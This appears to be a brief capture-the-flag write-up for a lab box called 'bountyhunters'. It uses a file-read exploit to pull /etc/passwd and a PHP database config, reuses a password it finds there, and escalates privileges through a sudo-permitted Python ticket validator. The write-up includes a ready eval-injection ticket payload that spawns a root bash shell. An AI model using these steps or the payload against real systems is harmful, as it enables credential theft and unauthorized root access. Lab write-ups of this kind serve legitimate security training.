# bountyhunters
file dump can be used with exploit.go, by default it traverse /proc/*/cmdline
pass -i flag for an interactive shell that you can pull down files with
```
./exploit -i
> /etc/passwd
> /var/www/html/db.php
```

## user
only login with /bin/bash in /etc/passwd is development, tried password found in db.php and it works

## priv esc
sudo -l shows `(root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py`

looking through the code we see it looks for a ticket file in format
```
# Skytrain Inc
## Ticket to place
__Ticket Code:__
**ticketcode+something

ticketcode % 7 must equal 4 - we can use 11, then remove code and eval after +
Our ticket to feed is ticket.md:
```
# Skytrain Inc
## Ticket to flavortown
__Ticket Code:__
**11+__import__('os').system('/bin/bash')
```